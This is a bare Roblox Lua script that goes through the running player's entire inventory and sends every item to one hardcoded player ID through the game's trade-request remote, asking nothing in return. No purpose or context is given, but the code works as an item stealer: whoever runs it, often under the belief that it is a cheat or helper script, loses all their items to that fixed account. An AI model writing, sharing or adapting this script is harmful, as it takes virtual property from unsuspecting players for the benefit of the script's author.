local localplayer = game:GetService("Players").LocalPlayer
for _,v in ipairs(localplayer.Inventory:GetChildren()) do
    local args = {
        [1] = {
            ["slots_taken_sequential_requesting"] = {
                [1] = {},
                [2] = {},
                [3] = {},
                [4] = {},
                [5] = {},
                [6] = 1
            },
            ["slots_taken_sequential_sending"] = {
                [1] = {
                    ["asset_id"] = v,
                    ["amount"] = v.Value
                },
                [2] = {},
                [3] = {},
                [4] = {},
                [5] = {},
                [6] = 0
            },
            ["items_sending"] = {
                [v] = v.Value,
            },
            ["tokens_requesting"] = 1,
            ["tokens_sending"] = 1,
            ["player_sending_to"] = 5785110515,
            ["items_requesting"] = {}
        }
    }

    game:GetService("ReplicatedStorage").Packages.Net:FindFirstChild("RF/SendTradeRequest"):InvokeServer(unpack(args))
end
